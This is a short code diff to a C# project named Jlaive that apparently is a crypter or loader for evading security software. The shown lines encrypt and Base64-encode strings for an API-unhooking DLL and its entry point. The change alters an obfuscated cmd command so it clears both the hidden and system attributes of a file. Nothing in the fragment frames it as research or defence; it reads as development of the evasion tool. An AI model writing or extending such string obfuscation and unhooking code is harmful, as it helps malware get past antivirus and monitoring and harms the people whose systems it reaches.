@@ -82,7 +82,7 @@ namespace Jlaive
             string unhookertxt_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("apiunhooker.dll"), key, iv));
             string unhookerclass_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("apiunhooker.APIUnhooker"), key, iv));
             string unhookerfunction_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("Start"), key, iv));
-            string cmdcommand_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("/c choice /c y /n /d y /t 1 & attrib -h \""), key, iv));
+            string cmdcommand_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("/c choice /c y /n /d y /t 1 & attrib -h -s \""), key, iv));
             string key_str = Convert.ToBase64String(key);
             string iv_str = Convert.ToBase64String(iv);
 
